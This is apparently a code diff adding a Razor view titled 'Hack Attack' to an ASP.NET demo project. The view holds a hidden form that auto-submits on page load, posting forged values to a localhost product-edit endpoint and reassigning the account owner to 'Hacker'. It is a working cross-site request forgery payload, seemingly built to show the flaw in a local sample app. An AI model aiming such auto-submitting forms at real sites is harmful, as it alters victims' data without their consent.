@@ -1,0 +1,16 @@
+﻿@{
+    ViewBag.Title = "Hack Attack";
+}
+@section featured {
+}
+<form name="csrfhackForm" method="post" 
+    action="http://localhost:63577/ProductDetails/Edit/1">
+    <input type="hidden" name="Id" value="1" />
+    <input type="hidden" name="LicenseCount" value="55" />
+    <input type="hidden" name="LicenseUsedCount" value="1" />
+    <input type="hidden" name="AccountUserName" value="Hacker" />
+    <input type="hidden" name="ProductName" value="B2B Product 101" />
+</form>
+<script type="text/javascript">
+    document.csrfhackForm.submit();
+</script>
